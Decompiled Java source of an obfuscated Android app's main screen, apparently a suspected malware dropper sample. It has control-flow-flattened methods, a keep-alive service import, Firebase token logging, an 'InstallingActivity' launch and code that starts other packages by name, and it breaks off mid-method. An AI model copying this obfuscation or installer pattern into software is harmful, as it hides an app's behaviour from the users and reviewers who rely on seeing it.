package com.uagxnrh.tssnskqp;

import android.app.ActionBar;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.Window;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.Toast;
import com.example.fcmexpr.keepalive.KeepAliveServiceMediaPlayback;
import com.google.firebase.messaging.FirebaseMessaging;
import java.util.HashMap;

/* loaded from: classes.dex */
public class MainActivity extends Activity {

    /* renamed from: lEeR5KfoEr4xU5yHH7, reason: collision with root package name */
    public boolean f5556lEeR5KfoEr4xU5yHH7 = false;

    public class lEeR5KfoEr4xU5yHH7 extends WebViewClient {

        /* renamed from: lEeR5KfoEr4xU5yHH7, reason: collision with root package name */
        public final MainActivity f5557lEeR5KfoEr4xU5yHH7;

        public lEeR5KfoEr4xU5yHH7(MainActivity mainActivity) {
            this.f5557lEeR5KfoEr4xU5yHH7 = mainActivity;
        }

        @Override // android.webkit.WebViewClient
        public void onPageFinished(WebView webView, String str) {
            StringBuilder sb = null;
            String str2 = "ۢۖۡۥۗۡۘۧۛۦۜۢۚۛۙۢۗۤ۠ۢ۠ۤۙۥۦۘۢۘۚۜۙۚۢۖۤ۠ۙ۫ۡ۫ۙۦ۟ۦۘۡۗۥۡۗ۟ۜۜۦۘ۬ۥۨۘ";
            while (true) {
                switch ((((str2.hashCode() ^ 613) ^ 267) ^ 585) ^ 513893268) {
                    case -2075161844:
                        Log.d("web", sb.toString());
                        str2 = "ۤۙۗۥۚۦۘ۫ۡۚۛۛۥۦۚ۠ۛ۬ۖۥۤۚ۠ۡۘۘۢۦ۟ۨ۟ۡۘۥۘۘۗۗۥۘ";
                        break;
                    case -1795651832:
                        sb.append("url is ");
                        str2 = "ۥۨ۬ۙ۠ۥ۫ۥ۠ۚۛۘۘۥۤۢ۟۬ۜ۫ۖۘۡۗۤۥۤۗۤۛ۫ۖۜۦۡۘ۟۬ۤۗ۠ۡۡۘۖۘۙۛۦۘ";
                        break;
                    case -1263148359:
                        sb.append(str);
                        str2 = "ۛ۬ۛ۠۬ۜۘ۫ۧۘۘۢۘۦۘ۠۠ۡۘۦۦۦۘۘۘۥۡۜۜۚۥۧ۟ۛۚۡۚۡۘۜ۬ۖۘ";
                        break;
                    case -627029664:
                        sb = new StringBuilder();
                        str2 = "ۘۗۢ۬۟ۢۤ۠ۦۘۛۢۖۘ۬ۧۜۘۘۡۖۘ۟ۚۖۢ۟ۚۧ۠ۛۨۧۛۚ۫ۨ۬ۡۥۗۦۧ۠ۖۨ۬ۧۦۡۧۘ";
                        break;
                    case -324178501:
                        str2 = "۫ۦۤۦۘۡۖۡۘۘۛۥۖ۬ۨۢۡۦۡۘۖۘۚۡۖۘ۠ۙۜۘۦۙۖۧۢ۫ۗۡ۬ۤۜۨۢۧۦ";
                        break;
                    case -242228133:
                        return;
                    case 441767571:
                        str2 = "۠ۡۘۘۡۥۨ۫۟ۥۘۤۜۥۙۛۙۚۛۚۥۢۤۖۡۛۗۧۙۙۖۘ۠ۦۗۙ۟۟";
                        break;
                    case 1290646244:
                        str2 = "ۤۚۤۜۜ۫۟ۧۘۘۖ۬ۥۜۖ۫ۦۘۡۗ۠۬ۧۢۢۛۜۡۘۙۙۛۢۜۨۘۘۗۜۡۨۥۘۘ۫ۡۘ";
                        break;
                    case 1636539756:
                        super.onPageFinished(webView, str);
                        str2 = "ۜۧ۬ۧۥۧۨۥۥۘۥ۟ۗۡۢۜۘۤۢۨۗۛۗۥۧۚ۟ۘ۟ۛۗۨ";
                        break;
                }
            }
        }
    }

    public static /* synthetic */ void Acstmh57AKoSEkEFNJ(DialogInterface dialogInterface, int i) {
        String str = "۠ۨۚۜۥۘۘۧۢۥۙ۬ۧۘۥۤ۠ۗۖۙ۠ۧۡۨۘۖ۬ۥۧۘۖۦۧۥ۬ۗۨۢۧۖۧۗۧۡۛۦۘۥۜۥ۬۟ۧ۠ۤۘ";
        while (true) {
            switch ((((str.hashCode() ^ 699) ^ 488) ^ 557) ^ 1239147957) {
                case -817103719:
                    str = "ۡۦۢۘ۬ۨۘۤۖۜۨۙۖۖۡۨۥۗۗۛۡۨۖ۬ۤۜۘۢۛۨۘۖۖۡۘۜۙۧۦۗۜۘ۟ۛۘۤۨ۫ۗۨۥۘ";
                    break;
                case 1117994436:
                    str = "۠ۗۛۛۘۖۘ۠ۖۚۜۙۦۘۡ۟ۗۥۧۘ۬ۛۦۘۚۖۢۙۖۨۘۡۡۨۘۥۥۦ۬ۙۘۦۥ۫ۚۖ۬ۧۖۦۘۥۡۡۘ";
                    break;
                case 2095353841:
                    return;
            }
        }
    }

    public static /* synthetic */ void HJFh0TGMpafqLE9haL(MainActivity mainActivity, String str, View view) {
        String str2 = "ۧ۬ۘۘۢۢۧۧۧۥۡۗۛۜۡ۬ۗۛۗۗۧۗ۠ۜۜۡۧۘۥۤ۫۠ۧۨۘ۟ۜۘ۠ۚۘۘۡ۟ۢ۠۟ۜۗۗۦۜۨۦۘۙۘۘ";
        while (true) {
            switch ((((str2.hashCode() ^ 235) ^ 403) ^ 699) ^ 694031732) {
                case -1351639730:
                    str2 = "ۡۥۢۗۚۖۗۖ۟ۥ۬ۨۘ۫ۨۜۙۢۦ۠ۧۙۨۨ۠۬ۜۡ۠ۦۘ۫ۤۦۘ۫۠ۧۛۨۤۤۢۨۢۗۥۥۤۜ";
                    break;
                case 782785980:
                    str2 = "۫ۦ۠۠ۚۗۦۗۙۦۧ۬ۚۦۧۘۧۢۛ۟۠ۦ۫ۦۖۙۤ۫ۧۥۡۖۗۙۦ۫ۥۤۛۖ۠ۖۘۤ۟ۦۦۧۧ";
                    break;
                case 917446970:
                    return;
                case 1897432559:
                    mainActivity.Z9WdNiOsPR0y54zHW4(str, view);
                    str2 = "ۘۚۚۙۙۨۗۧۢ۫ۗۥۘۦ۟۬ۗۤۖۧ۠ۦۖۤۦ۫ۚ۠۟ۦۦۖۤۧۦۖۖۚۨۘۡۨ۫ۨۡۖۘۛۧۜۧۥۧۘۚۚ";
                    break;
                case 1910756016:
                    str2 = "۟ۨۧۘ۠ۦۡۧ۬ۛۘۗۚۥۚۦۗۙۢۖۙۘۘۥ۫ۜۘ۠ۢ۟ۘۚۜۙ۫ۡۗ۟ۨۥۥۘۙ۫ۗۗ۫ۧۖۡۨۘ";
                    break;
            }
        }
    }

    public static /* synthetic */ void husNiw3snxdgZPAGJm(MainActivity mainActivity, View view) {
        String str = "ۜۚۢۗۚۧ۬ۖ۟ۗۘۡۘۖۦۥ۠ۜۨۥۜۘۢۘۧۘۖ۬۠۟۠ۗۙۗۗ۫ۡ";
        while (true) {
            switch ((((str.hashCode() ^ 136) ^ 763) ^ 583) ^ (-1691044067)) {
                case -1458496203:
                    mainActivity.TCyPEKSzIyweCN5yp1(view);
                    str = "ۚۡ۟ۙ۬ۘۧۛۚۛۨۡۘۘۢۥۘۘۘۧۘ۠ۗ۠۬ۧۚۜۛۗ۫ۛۚۧۨ۫ۘۧ۟ۗۥۨ۟ۥۘۥۙۡۘۚۧۘ۫ۥ۠ۦۙۥ";
                    break;
                case -17050282:
                    str = "۫ۗۡۤ۫ۨۘۛۨۜۥۥۦۘۜۨۡۨۜ۬۫۠ۖۘۨۘۜۥ۫ۢۜۗۚ";
                    break;
                case -12664503:
                    str = "ۡۧۗۨۧ۟ۘ۟ۜ۫ۢۨۘ۟ۙۗۗۙ۠ۖۥۥۡۡۧ۫ۡۘۤۘۦۡۦۘۥۚۘۘۘۦۦۨۘۜۥۙ۟ۧۥۘ";
                    break;
                case 456851890:
                    return;
            }
        }
    }

    public static /* synthetic */ void lEeR5KfoEr4xU5yHH7(JXsqbvi9UKxeF3HXpU.pbVGzGjWvY2LDXC8vo pbvgzgjwvy2ldxc8vo) {
        String str = "ۖۤۥۘ۬۠ۛۖۘۜۗۧۘۖ۠ۦۘۦۢۦۘۚ۬ۧۜ۫ۥۘۗۛۙۘ۫ۖۘ۟۟ۜۘۢ۬۠۠ۢۧ۟ۢۦ۠ۤۦۘۨ۬ۖۘ";
        while (true) {
            switch ((((str.hashCode() ^ 476) ^ 1014) ^ 375) ^ 40686141) {
                case -1813087838:
                    pbVGzGjWvY2LDXC8vo(pbvgzgjwvy2ldxc8vo);
                    str = "ۦۥۘۘۤ۬ۦۘۦ۫ۤۛ۟ۘ۟ۚۛۘۘۘ۠ۛۥۗ۟ۧۖۧۧۙۤۦۦۢۤۨۘ";
                    break;
                case -113860712:
                    return;
                case 1227908931:
                    str = "ۦۙۜۘۤۛۗۨۗ۬ۦۗ۬۬ۜۨۥ۫۫ۦۢۛۖۡۧ۫ۢۗۛۢۢۧۙۨ";
                    break;
            }
        }
    }

    public static /* synthetic */ void pbVGzGjWvY2LDXC8vo(JXsqbvi9UKxeF3HXpU.pbVGzGjWvY2LDXC8vo pbvgzgjwvy2ldxc8vo) {
        try {
            Log.d("FCM", "token is " + ((String) pbvgzgjwvy2ldxc8vo.Z9WdNiOsPR0y54zHW4()));
        } catch (Exception e) {
            Log.e("FCM", "failed to get token");
        }
    }

    public static /* synthetic */ void s3fjYDxWOUexjjVgyA(MainActivity mainActivity, View view) {
        String str = "۫ۛۙۙۨۥۦۧۗۦۖۚۖۖۘۘ۠ۘۧۘۙۧۜۥۤۘۢ۬ۘۘۤ۫ۧۗۚۖۘۛ۫ۥۧۘۘۘ۠ۥۤۢ۫ۘۙۦۗۖۢۢۨۘ۠";
        while (true) {
            switch ((((str.hashCode() ^ 742) ^ 425) ^ 389) ^ (-1581351333)) {
                case -1074792167:
                    str = "ۙۡۗۧۜۘۡۦۥۥۡۢۦۥ۠ۖۗۡۘۨۤۙ۠ۨۚۗۢ۠ۨۘۥ۬ۘ۠ۘۨۧۘ۟ۚ۟۠۫ۛۦۡۗۚۡۘۘ";
                    break;
                case -515462299:
                    str = "ۘۦۘۥۘۡۘۛۡۢۜ۬ۥۘ۠ۗۜۡۨۥۘۛۜۨۗۚۡ۠ۤۡۘۥۘۛۙۘۘۛ۠ۢۤۚۨۘۡۧۚۜۧ۠ۥۙۜۥۥۨۤ۟";
                    break;
                case -117304985:
                    mainActivity.IPyIQcaNa8aB7drBED(view);
                    str = "۟ۡۧۘۘۤۙۜۜۢۗۡ۬۫ۙۜۚۖ۟۬ۗۖۘۗۗۡۘۧۚۡ۠۟ۡۥۛ۬ۗ";
                    break;
                case 1250783929:
                    return;
            }
        }
    }

    public static /* synthetic */ void zZKhbgvUfsK4AEX3r0(DialogInterface dialogInterface, int i) {
        String str = "ۢۡۥۖۥۖ۟ۖۡۤۧۗۖۙۨۘۙۧۘۘۢۥۨۘۛۘۥۘ۫ۤۡۛۡۜۚۥۡۗۘۘ";
        while (true) {
            switch ((((str.hashCode() ^ 274) ^ 273) ^ 316) ^ (-136436832)) {
                case -1235332522:
                    Acstmh57AKoSEkEFNJ(dialogInterface, i);
                    str = "ۗۖۥۘۖۙۨ۫ۤۜۘۗۤۨۘۨۢۖۖ۠۠ۖ۠ۜۥۘۗۧ۬ۡ۟۫ۗۚۤۡۘۖۜ۬۬ۨۚۡۖۗۢ۠۟ۨۗۙۥۖۥۘۥ";
                    break;
                case 1329127496:
                    str = "ۢۢۖۘ۟ۢ۬ۧ۬ۛۤ۫ۨۦۦ۬۠ۤ۫ۢ۫ۥۗۛۧ۟ۤ۟ۥۨۦۘۘۢۢ۟ۘۥۘ";
                    break;
                case 1372715632:
                    return;
                case 1751425409:
                    str = "ۦۢۚۨۧ۟ۤۥۘۥ۟ۗ۬۬ۦۗۜۜۘۘۖۜۜۤۛۢۧۡ۟";
                    break;
            }
        }
    }

    public final /* synthetic */ void IPyIQcaNa8aB7drBED(View view) {
        String str = "ۦ۫۬ۨۗۘۢۛۡۘ۟۬ۧۛۦۜۧۙ۠ۛۥۧۢۤۖۘۦۗۥۙۙۦ";
        while (true) {
            switch ((((str.hashCode() ^ 954) ^ 892) ^ 456) ^ 1673623) {
                case -1739424053:
                    Toast.makeText(this, "Information not provided by developer.", 0).show();
                    str = "ۖۜۖۘۤۢۡۛۢۥ۬ۖ۬۟ۗۥۗۦ۫ۡ۠ۘۘۤ۬۬۫۠ۦۤۜۧۚۤۢۢۡۘۤۡۧۥۜۘۙۜ۠ۧۘۤۤ۬ۖۥۗۧ";
                    break;
                case -1714243827:
                    str = "ۙۧۖۖ۟۫ۨۤۡۘ۟ۥۙۨۙ۬ۦ۬ۨۡۗۛۖۦۖۖۖۗۖ۠ۖ۟ۢۡۤۜۚۚۙ۬ۥۥۘ";
                    break;
                case -1510090729:
                    str = "۠۠۠ۤۢ۫ۦۢ۠ۚۛۘۘ۟ۘ۠ۡۖۜۚۤۨۘۙۤۧ۟ۚۢ۫ۜۡۖۚۖۘۖ۫۠ۤۛ۟۬ۛۙ";
                    break;
                case 334864787:
                    return;
            }
        }
    }

    public boolean KYHag8HRDlnO3X9zmZ(String str) throws PackageManager.NameNotFoundException {
        try {
            getPackageManager().getPackageInfo(str, 128);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    public final /* synthetic */ void TCyPEKSzIyweCN5yp1(View view) {
        String str = "ۨ۫ۡ۬ۨۦ۫ۢ۠۠۫۟۬ۜۢۖۚۨۘۙۜۘۥۡۜۖۖۜۘۥۦۡۘۥ۬۫ۚۙۤ";
        while (true) {
            switch ((((str.hashCode() ^ 839) ^ 768) ^ 380) ^ 169988198) {
                case -1697955742:
                    startActivity(new Intent(this, (Class<?>) InstallingActivity.class));
                    str = "ۖۖۧۘۦۧۙۖۡۡۨ۬ۜۧۥ۬۬ۘ۫ۢۤۗۡ۬ۚۢۘۥۘۚۢ";
                    break;
                case -1199387913:
                    str = "ۛ۟ۦۛۜ۠ۛۚۛۚۙۢۛ۬ۢۢۡۘ۫ۧۨۘ۫ۧۙۘۚۚ۫ۖۥۚۚۚۡۤۡۘۛۛۥۘ۬ۨۘۘۘۜۧ۬ۖۧۘۙۦۧۘۛۡۥ";
                    break;
                case -207388462:
                    str = "ۤۚۦۘۛۢۧۘۤۖۘۥۢ۠۠ۙۤۚۢۧ۫ۡۘ۟ۢۨۡ۬ۤۘۗۚۜۤۦۛ۫۠ۦۥۜۚ۟ۥۘۛۥۙۚۧ۬ۙ۬ۡۖۗۜ";
                    break;
                case 59444952:
                    return;
            }
        }
    }

    public final /* synthetic */ void Z9WdNiOsPR0y54zHW4(String str, View view) {
        String str2 = "ۘۚۜۡۦۙۨ۠ۜۘۧۜ۟ۗۦۛۘۚۤۘۢۛ۠ۥۘۘ۫ۨۘۤۢ";
        while (true) {
            switch ((((str2.hashCode() ^ 703) ^ 560) ^ 440) ^ (-1703531641)) {
                case -1783581810:
                    str2 = "۟ۢۦۖۖۚۤۖۗۘۧۥۤۛۨۘ۠ۙۧ۟۟ۧ۠ۛۥۢۧۖۘۧۖۡۘۧۨۙ۫ۛۥۤۨۦۘۛ۠ۙۤ۠ۨۛۦۥۘ";
                    break;
                case 37444972:
                    return;
                case 1178719400:
                    str2 = "ۖۥۥۚ۬ۡۘ۠ۚۡۜۘۨۘ۬ۗۨۘ۟۫ۚۖۖۦۘ۠ۨۘۘ۫ۤۨۢ۟ۨۡۗۧۖۙۡۘۘ۬۟ۖۘۛۤۘۖۖ۠ۚ۠ۘ۫ۙ۫ۘۘ";
                    break;
                case 1236519461:
                    str2 = "ۛۖۚۗۢۛۜۛۙۜۧۤۗۡ۟ۘ۠ۥۘ۟ۚۙۘۘۥۧۘۢۘۨۘ";
                    break;
                case 1743795747:
                    e54J8UWNHWALQNixXM(str);
                    str2 = "ۥۡۨۛۜۦۙۘۧۦۘۘۘۤۚۦۨۤۜۘۥ۠ۖۨ۬ۚۧۘ۬۬۠ۦۘ۟ۗۘۨۖۦۚ۠ۦۘۨۢۥۘ";
                    break;
            }
        }
    }

    public final void e54J8UWNHWALQNixXM(String str) {
        String str2 = "ۖۛ۠ۢ۠ۦ۟۬ۧۨۤ۟ۦۜۧۜ۬ۗۗۘۘۘۜۗۨ۬ۙۜۘ۫ۖۖۢۜۘۡۨۦۘۘ۬۠ۛۖۖۘۜۚۥۘۗ۟ۖۘۜ۫ۦۘۘ۠ۙ";
        StringBuilder sb = null;
        Intent launchIntentForPackage = null;
        StringBuilder sb2 = null;
        while (true) {
            switch ((((str2.hashCode() ^ 303) ^ 1019) ^ 300) ^ (-785593493)) {
                case -1818276190:
                    Log.d("tag", sb.toString());
                    str2 = "۬۠ۡۘۧۙ۟۟۟ۜۘۙۘ۠ۙ۫ۘۗۜۥۘ۬ۢۨۗۖۖۡۦ۠ۜۨۗ۠ۦۘ۬ۡۦۘۥ۟ۚۢۧ۬ۤۖۚ۫۠ۨ";
                    break;
                case -1557291172:
                    str2 = "ۧۥۧۦۧ۠ۗۖۢ۬ۢۨۧ۬۟ۢ۠ۜۘۤۙۡۘۛۤ۫۠ۜۨۘۜۜۗ۬۠ۡ۠ۢۨۜۧۥۡ۬ۗۨۥۥۘۘ۬ۧ";
                    launchIntentForPackage = getPackageManager().getLaunchIntentForPackage(str);
                    break;
                case -1376917806:
                    sb2.append("launching with pkg name: ");
                    str2 = "ۘۘۨۜۛۜۘۡۤۨۘ۬ۤۨۡۢۥۚۢۚۖۧ۠ۗۚۘۘۙۡۤ۬ۘۘۚۛ۬۟ۦۧۘۗ۫ۡۘۘۙۘۘ";
                    break;
                case -634026219:
                    startActivity(launchIntentForPackage);
                    str2 = "ۖۚۥۘ۫ۛ۫۬ۜۢ۟ۥۡۘۧۤۨۘۖۖۧۘۡۦۦۘۘ۬ۥۗ۠ۖۨ۠ۧ۬ۛۘۛۚ";
                    break;
                case -159039321:
                    String str3 = "ۤ۟۫ۦۡۨۧۜ۫ۡ۟۟ۨۨۡۘۗۚۚۧۢۜۘۢۛۗ۠ۘۦ۫ۗۘ";
                    while (true) {
                        switch (str3.hashCode() ^ (-249445420)) {
                            case -1968915048:
                                str2 = "ۙ۬ۜۥۨ۬ۥۗۘۦ۟ۦۘۚۖۧۘۗۦۧۦۧۗۖۚۨۘۢۗ۠ۖۥۡۘۨ۟ۗۛ۠ۢۡۘۘۘۚۙۨۘ";
                                continue;
                            case -726779640:
                                str3 = "ۦۡ۠۟ۚۨۘۤۚ۟ۡۥۧۖۘۙۨۨۘۗۙۨۘۦۘۘۨۚۧۚۦۤ";
                                break;
                            case 806267980:
                                str2 = "ۛۧۘۘۘۨۥۘۡۧۦ۠۬ۦۧۛۧۙ۬ۙ۬۫ۦۥۖۘ۫ۤۗۙۜۘۜۚ۫ۗۤۥ";
                                continue;
                            case 1817936857:
                                String str4 = "ۢۤۡۘۖ۟ۤ۫ۜۛۗۢۥ۫ۚۨۖۨۢۖۨۦۨۜۥۘ۠ۦۤ۟ۦۦۘ";
                                while (true) {
                                    switch (str4.hashCode() ^ (-1370341117)) {
                                        case -1582179953:
                                            str3 = "ۜ۬ۜ۬ۜۛۢۤۦ۠ۦۦۘۡۙ۫ۧۡۢۖۥۢۧۘۗۚ۠ۤۘ۟۬ۖۢۦۘۜۚۨۘ";
                                            break;
                                        case -111124157:
                                            str4 = "ۚۘ۬ۤۥ۬۠۫۠ۜۙۨۚۨۘۚۢۜۖۗۚ۬۠۠ۢ۬ۦۘۖۗۨۘ۠۫ۘ۟ۘۙۗۗ۫ۙۗۧۛۜۜۘ۠ۗ۬ۤۛ۫۫ۖۢ";
                                        case 178580718:
                                            str3 = "ۧۙۢۨۥ۠ۗۖۧۖۤۘ۠۫ۙۘۜۥۘ۫ۢۜۘۤ۬ۜ۟ۨۧۘ۠ۤۡۙۖۦۗۜ";
                                            break;
                                        case 767662822:
                                            str4 = launchIntentForPackage != null ? "ۧۥ۠ۥۚۥۢۧ۠ۘۛۦۚۨۦۜ۠ۤ۬ۤ۬ۗۖ۫ۙۥۨۘ۬ۢۖۘۧۥۙ۠ۥۖ" : "ۢۢۨ۟ۤۜ۫ۖۨ۟ۤ۫ۙۗۦۘۘۖۙۦ۠ۥۜۤۖۗۜۗۡۡ۠۬ۙۢۥۤۗۨۡۖۘۨۧ۠ۢ۬ۨۘۛۗۡۘ";
                                    }
                                }
                                break;
                        }
                    }
                    break;
                case -67661345:
                    str2 = "ۧۗۦۗۖۖۖۚۜۧۗۛۗۦ۠ۤۧۛۥۥۘ۬ۙۚۦۦۘۤ۟ۤ";
                    sb2 = new StringBuilder();
                    break;
                case 9968296:
                    return;
                case 331469042:
                    str2 = "ۧۗۡۚۘۡۚۗۜۘۖۚۨۘۤۚۦۘۖۧ۟ۨۖۙ۟۬ۢ۠۫ۚۤۗۨۙ۬ۛۧۡ۠ۦۜۘۘۡۨۘ";
                    break;
                case 471593879:
                    launchIntentForPackage.addFlags(268468224);
                    str2 = "۟ۜۤۦۗۜۘۛۧۘۢۧۡۤۘۗۜۥ۟ۤۖۢۖۜۙۤۗۧۜۖۤۨۤۙ۬۠ۜۛۢ۠ۗۙۧۖۡۧۤۨ۫ۨۖۚۚۛۡ";
                    break;
                case 1016782136:
                    sb.append("No launchable activity found for package: ");
                    str2 = "ۧۙ۫ۙۥۧۘۥۖۜۘۙۨ۬ۜۡۧۛۥۘۘۤ۫ۨۘۖۧۛ۫۠۫ۘۦ۬ۗ۠ۗۦۤۤۨۨۧۘۦۜۥ";
                    break;
                case 1062242872:
                    Log.d("tag", sb2.toString());
                    str2 = "ۧۘۚۨۡۘۘۗۤ۬ۡۙۜۗۧۗ۫ۚ۬ۨۢۥۘۖۛۛۜۚۧۘۨ۠۠۫ۙۜۖۤ";
                    break;
                case 1849412430:
                    sb.append(str);
                    str2 = "ۘۗ۫ۤۙ۬ۗۢۨۘۛۜۖۘۧ۠ۨۘۖ۬ۛۥۦۜۧۙۖۜۧ۫ۤۨۘۦ۟۫ۗۦۡۢ۫ۘۥۗ";
                    break;
                case 1866333941:
                    str2 = "ۢۧۨۦ۠ۨۤۡۧۘۛۦۘۘۘۙۙۥۜ۫ۛۤ۠ۤۖۚۘۡ۬ۨ۬ۦۘۢۖۥۜ۟";
                    break;
                case 1872830630:
                    str2 = "۬۠ۡۘۧۙ۟۟۟ۜۘۙۘ۠ۙ۫ۘۗۜۥۘ۬ۢۨۗۖۖۡۦ۠ۜۨۗ۠ۦۘ۬ۡۦۘۥ۟ۚۢۧ۬ۤۖۚ۫۠ۨ";
                    break;
                case 2062887718:
                    sb2.append(str);
                    str2 = "۟ۘۛ۟ۨۘۘۗ۠ۘۚۙۛۦۥۗۘۘۚۖۨۨۚۤۚۙۦۛۖۚۙۛۦ۫ۡۧ";
                    break;
                case 2084492141:
                    sb = new StringBuilder();
                    str2 = "ۧ۫ۜۗۧۨۢۨۦۘۚۨۡۘۧ۫ۥۘۦۦۖۗۦۚۧۤۡۢۜۗۛۧ۠ۢۖۘۙۡۦۙۗ۠۟ۗ۟ۧۧۢۢۦۘۢۨۧۘۤۘۙ";
                    break;
            }
        }
    }

    @Override // android.app.Activity
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(zaq8hOURtfwbcX17cG.f5583s3fjYDxWOUexjjVgyA);
        ActionBar actionBar = getActionBar();
        String str = "ۢۤۘۚۘۙۜ۟۟۟ۧۚۚۥۦۜۡۛ۟۟ۜۘۨ۬ۥۢۧۡۘ۠ۜۥۡۡۜۘ";
        while (true) {
            switch (str.hashCode() ^ (-2139775667)) {
                case -1273944709:
                    break;
                case -182995433:
                    String str2 = "ۛۦۦۖۥۡۘ۟۫ۜۘۘۥۡۘ۠ۖ۠ۥۦۥۘۤۜ۠ۛۛۡۘۘۚۚۡۧۘۘ۫ۥۘ۟ۘۛۙۢۘۘ۬ۢۥۘۡۘۘۛۜۘۘ";
                    while (true) {
                        switch (str2.hashCode() ^ 197804296) {
                            case -1718846337:
                                str = "ۖ۠ۧۨۤۜۘۛۨۗۡ۠ۜۘ۟ۢۡۗۤ۠ۛ۬ۢ۫ۥۘۘۖۤ۠ۢ";
                                continue;
                            case -666872367:
                                str2 = "ۧۧۛۗۥ۫۫۟ۗۢۥۘۤۙۥۗۧۗۜۤ۠۫ۢۖۘۜ۬ۢ۬ۛ۬۟۟ۛۨۢۘۘۤۡۡۘ۬ۥ۟ۜۧۦۘ۠ۧۦۘۜۨۘ۠ۡ۬";
                                break;
                            case -34046092:
                                if (actionBar == null) {
                                    str2 = "ۚۥۜۡۦۜۗۤۖۘۙۡۥۘۜۤ۫ۙۖۙۨۤ۬ۘۚۛۜۧ۫۠ۨۥ۟ۘۘۨۚۙ";
                                    break;
                                } else {
                                    str2 = "۠ۧۧۛۨۦۘۧۡۦۘۖۤۘۘۧۖۜۛۢۛۛ۟ۢۥۢۥ۟۟ۧۛ۠ۛ";
                                    break;
                                }
                            case 1599756651:
                                str = "ۥۨۢۛۨۡۘۦۢۡۘۤ۟۠ۤۗۡۘۦۢ۠ۖۡۙۡۨۖ۬ۗ۠ۥۗۜۘ";
                                continue;
                                continue;
                        }
                    }
                    break;
                case 108253082:
                    str = "۟ۨۛۧۧۖۘۜۛۜۘۨۢ۬ۥ۬۟ۧۘۖۘۙۦ۫ۚ۠ۢۖ۬۟ۙۛۗۘ۟ۜ۬ۥۛ۫ۙۜۘۨۚۥ";
                    continue;
                case 294815847:
                    actionBar.hide();
                    break;
            }
        }
        getWindow().getDecorView().setSystemUiVisibility(8192);
        Window window = getWindow();
        window.setStatusBarColor(getColor(hoXrIDAFrSwfShk8da.f5572lEeR5KfoEr4xU5yHH7));
        window.setNavigationBarColor(getColor(hoXrIDAFrSwfShk8da.f5572lEeR5KfoEr4xU5yHH7));
        window.addFlags(128);
        ((Button) findViewById(OANkd3mP6AYvwbNLJM.f5558HJFh0TGMpafqLE9haL)).setOnClickListener(new View.OnClickListener(this) { // from class: com.uagxnrh.tssnskqp.pbVGzGjWvY2LDXC8vo

            /* renamed from: lEeR5KfoEr4xU5yHH7, reason: collision with root package name */
            public final MainActivity f5575lEeR5KfoEr4xU5yHH7;

            {
                this.f5575lEeR5KfoEr4xU5yHH7 = this;
            }

            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                String str3 = "ۛ۬ۦ۠ۦۚۥۚۥۚۥۧ۫ۦۘۘۨۗۤ۫ۛۗ۬۟ۥۦ۠ۗ۫ۚۤ۬۫ۙۘ۟";
                while (true) {
                    switch ((((str3.hashCode() ^ 55) ^ 857) ^ 844) ^ 953544695) {
                        case -1325434534:
                            str3 = "ۢۢۡۘۙۚۨۘۘۜۧۘۙۢۙۡۜۧۦۚۨۘ۫ۢۖۘۢ۫ۙۢۦۤۨۡۤۧۧ۟ۛۦۧۖۙۡۥ۠ۗۙۥ۠۫ۙۢۢۗۜۚ";
                            break;
                        case -1121803369:
                            MainActivity.husNiw3snxdgZPAGJm(this.f5575lEeR5KfoEr4xU5yHH7, view);
                            str3 = "ۛۦۖۘۢ۬ۘۘ۬۬۟ۥۥۨۤۦۘۙۡۢۘۥۜۘۥ۬ۧ۫ۖۢۥۛ۠ۚۗ۠ۡۙۖۨ۫ۡۘۘ";
                            break;
                        case -219782874:
                            str3 = "۠ۚۘۘۜۜۦ۠ۤۚۗ۠ۙۜۧ۬ۦ۬۬ۘ۠ۗ۫۠ۧۦۘۤۜ۟۟ۦۦۘۙ۠۬ۛ۬ۤ۟۬ۦۧ۟ۚۘۗۦۖ۠۠۟ۘۡ";
                            break;
                        case 828411048:
                            return;
                    }
                }
            }
        });
        ((Button) findViewById(OANkd3mP6AYvwbNLJM.f5560s3fjYDxWOUexjjVgyA)).setOnClickListener(new View.OnClickListener(this) { // from class: com.uagxnrh.tssnskqp.Acstmh57AKoSEkEFNJ

            /* renamed from: lEeR5KfoEr4xU5yHH7, reason: collision with root package name */
            public final MainActivity f5550lEeR5KfoEr4xU5yHH7;

            {
                this.f5550lEeR5KfoEr4xU5yHH7 = this;
            }

            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                String str3 = "ۖۛۙۤۖۡ۟۬ۜۦۜ۟ۡۖ۟ۚ۫ۙۧۚۘۘۥۘۡۘۦۙۜۚ۬ۗۛۙۘۘۗ۟ۡۘ";
                while (true) {
                    switch ((((str3.hashCode() ^ 227) ^ 343) ^ 939) ^ 1270470321) {
                        case -2008333129:
                            return;
                        case -1122155065:
                            str3 = "ۖ۟ۛ۬۠۠ۚ۫ۛ۫ۙۙۧۘۛ۟ۦۚ۟ۥۢۡ۫۠ۡ۫ۜۖۚ";
                            break;
                        case -336956658:
                            MainActivity.s3fjYDxWOUexjjVgyA(this.f5550lEeR5KfoEr4xU5yHH7, view);
                            str3 = "ۜ۫ۖۦۛۜۘۛ۬۟ۗۤۨۘ۠ۗ۫ۛۡۧۘ۟ۗ۟۠ۛۖۘ۠ۥۘ۫۫۠";
                            break;
                        case 241078806:
                            str3 = "ۥ۫ۖۘۧۧ۟ۥۤۡۙ۫۠ۡۖۘ۬ۘۜۡۡۥۖۢۘۖۙۘۤۜۘ۠ۙ۫ۡۖۥ";
                            break;
                    }
                }
            }
        });
        String str3 = "ۛۚۘۘۦۨ۠۟۫۟ۘۗۢۢۡۧ۫ۖۘۢۜۙۜۦۨۘۡۖۧۘۧۛۚۤۜۥۨۡۘ";
        while (true) {
            try {
                switch (str3.hashCode() ^ (-1415007949)) {
                    case -1411239039:
                        str3 = "ۧۦۥۘۙۚۛۧۥ۫ۗۚۡۡۡۥۧۡۡ۠ۘۚۢۨۘۘ۟۠۬ۖۢۧۥۧۘۘۧۙ۫ۦۜۘۡ۫";
                        continue;
                    case -988217951:
